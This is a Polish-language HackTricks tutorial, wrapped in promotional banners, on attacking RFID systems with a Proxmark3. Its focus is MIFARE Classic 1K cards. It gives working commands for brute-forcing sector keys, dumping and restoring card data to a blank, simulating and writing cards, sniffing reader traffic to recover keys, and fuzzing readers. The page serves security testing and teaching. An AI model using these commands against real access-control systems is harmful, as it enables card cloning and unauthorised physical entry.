# Proxmark 3

<details>

<summary><strong>Zacznij naukę hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie z branży cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Atakowanie Systemów RFID za pomocą Proxmark3

Pierwszą rzeczą, którą musisz zrobić, jest posiadanie [**Proxmark3**](https://proxmark.com) i [**zainstalowanie oprogramowania oraz jego zależności**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Atakowanie MIFARE Classic 1KB

Ma **16 sektorów**, z których każdy ma **4 bloki**, a każdy blok zawiera **16B**. UID znajduje się w sektorze 0 bloku 0 (i nie może być zmieniony).\
Aby uzyskać dostęp do każdego sektora, potrzebujesz **2 kluczy** (**A** i **B**), które są przechowywane w **bloku 3 każdego sektora** (sektorowy blok końcowy). Sektorowy blok końcowy przechowuje również **bity dostępu**, które nadają uprawnienia do **odczytu i zapisu** na **każdym bloku** za pomocą 2 kluczy.\
2 klucze są przydatne do nadawania uprawnień do odczytu, jeśli znasz pierwszy, i zapisu, jeśli znasz drugi (na przykład).

Można przeprowadzić kilka ataków
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 pozwala na wykonanie innych działań, takich jak **podsluchiwanie** komunikacji **Tag-Reader** w celu próby znalezienia danych poufnych. Na tej karcie można podsłuchać komunikację i obliczyć użyty klucz, ponieważ **operacje kryptograficzne są słabe**, a znając tekst jawny i zaszyfrowany, można go obliczyć (narzędzie `mfkey64`).

### Surowe polecenia

Systemy IoT czasami używają **tagów niebrandowanych lub niekomercyjnych**. W takim przypadku można użyć Proxmark3 do wysyłania niestandardowych **surowych poleceń do tagów**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Z tymi informacjami możesz spróbować wyszukać informacje o karcie i o sposobie komunikacji z nią. Proxmark3 pozwala na wysyłanie poleceń w postaci surowej, na przykład: `hf 14a raw -p -b 7 26`

### Skrypty

Oprogramowanie Proxmark3 jest dostarczane z preinstalowaną listą **skryptów automatyzacji**, które można użyć do wykonywania prostych zadań. Aby uzyskać pełną listę, użyj polecenia `script list`. Następnie użyj polecenia `script run`, a następnie nazwy skryptu:
```
proxmark3> script run mfkeys
```
Możesz stworzyć skrypt do **fuzzowania czytników tagów**, aby skopiować dane z **ważnej karty**, po prostu napisz **skrypt Lua**, który **losowo zmienia** jedno lub więcej losowych **bajtów** i sprawdź, czy **czytnik ulega awarii** w dowolnej iteracji.

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie z branży cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
